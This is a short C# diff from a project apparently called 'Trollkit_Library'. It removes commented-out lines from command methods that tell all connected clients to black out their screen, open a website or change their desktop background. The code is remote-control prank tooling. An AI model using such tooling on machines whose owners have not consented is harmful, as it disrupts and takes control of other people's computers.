@@ -54,14 +54,12 @@ namespace Trollkit_Library.ViewModels.Commands
 		private void SendTurnOffScreen()
 		{
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "BlackScreen", Handler = handler, Value = "" };
-			//App.Server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
 			_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
 		}
 
 		private void SendOpenSite()
 		{
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "OpenSite", Handler = handler, Value = "https://google.com" }; //tbOpenSite.Text };
-			//App.Server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
 			_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
 		}
 
@@ -78,7 +76,6 @@ namespace Trollkit_Library.ViewModels.Commands
 				string base64 = Convert.ToBase64String(bytes);
 
 				TransferCommandObject returnObject = new TransferCommandObject { Command = "SetBackground", Handler = handler, Value = base64 };
-				//App.Server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
 				_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
 			}
 		}
